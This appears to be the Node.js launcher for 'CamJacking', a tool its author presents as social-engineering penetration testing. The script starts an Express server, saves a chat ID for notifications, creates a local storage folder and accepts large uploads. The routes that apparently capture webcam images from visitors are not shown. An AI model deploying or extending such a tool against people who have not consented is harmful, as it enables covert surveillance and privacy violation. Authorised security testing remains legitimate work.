#!/usr/bin/env node
/**
 * CamJacking
 * CamJacking is a tool designed for use in human penetration testing tool. It is intended to simulate potential security threats by testing the negligence of people, and is used to identify weaknesses in an organization's security infrastructure. By using CamJacking, security professionals can gain a better understanding of their organization's potential risks and take proactive measures to improve their security posture.
 *
 * @author karthikeyan V (karthithehacker) <https://karthithehacker.com>
 */

const express = require("express");
const app = express();
const path = require('path');
const fs = require("fs-extra");
const help = require('./includes/help');
const bodyParser = require('body-parser');
const conf = require('./includes/config');
const os = require("os");
const yargs = require('yargs/yargs');
const { hideBin } = require('yargs/helpers');

const homeDir = os.homedir();
const argv = yargs(hideBin(process.argv)).argv;

const port = argv.p || argv.port;

(async () => {
    if (argv.h) {
        help.helpintro();
        help.helpmenu();
        return;
    }

    if (argv.c) {
        help.helpintro();
        const checkResult = await conf.checkId();
        const chatid = await conf.getChatId()
        if (checkResult === 'Exist') {
            console.log(`Chat ID Exists ===> ${chatid}`);

            return;
        } else {
            conf.newChatId(argv.c)

        }
    }

    if (!argv.c && !port) {
        help.helpintro();
        help.helpmenu();
        return;
    }

    if (port) {
        app.listen(port, () => {
            help.helpintro();
            console.log(`Server running on port ${port}`);
            console.log(`URL=====> http://localhost:${port}`);
        });
    }

    try {
        await fs.access(path.join(homeDir, "camjacking"));
    } catch (err) {
        await fs.mkdir(path.join(homeDir, "camjacking"), { recursive: true });
    }

    
    app.set('views', path.join(__dirname, 'views'));
    app.set('view engine', 'ejs');
    app.use(bodyParser.json({ limit: "50mb" }));
    app.use(bodyParser.urlencoded({ limit: "50mb", extended: true, parameterLimit: 50000 }));
    app.use(express.static(path.join(__dirname, 'Assets')));
    app.use(require('./includes/route'));
})();
